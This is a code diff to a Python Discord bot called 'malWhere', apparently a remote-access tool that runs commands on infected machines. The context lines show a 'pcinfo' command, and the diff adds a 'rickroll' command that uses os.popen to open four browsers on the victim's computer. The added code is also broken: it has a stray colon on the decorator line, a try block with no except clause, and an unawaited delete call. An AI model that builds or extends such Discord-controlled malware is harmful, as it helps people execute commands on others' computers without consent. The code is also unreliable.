@@ -109,5 +109,13 @@ async def pcinfo(ctx):
     await ctx.message.delete()
   await ctx.channel.send("wrong channel skid")
 
+@malWhere.command():
+async def rickroll(ctx):
+  try:
+    os.popen("chrome https://www.youtube.com/watch?v=dQw4w9WgXcQ")
+    os.popen("firefox https://www.youtube.com/watch?v=dQw4w9WgXcQ")
+    os.popen("opera https://www.youtube.com/watch?v=dQw4w9WgXcQ")
+    os.popen("brave https://www.youtube.com/watch?v=dQw4w9WgXcQ")
+  ctx.message.delete()
 
 malWhere.run(TOKEN)
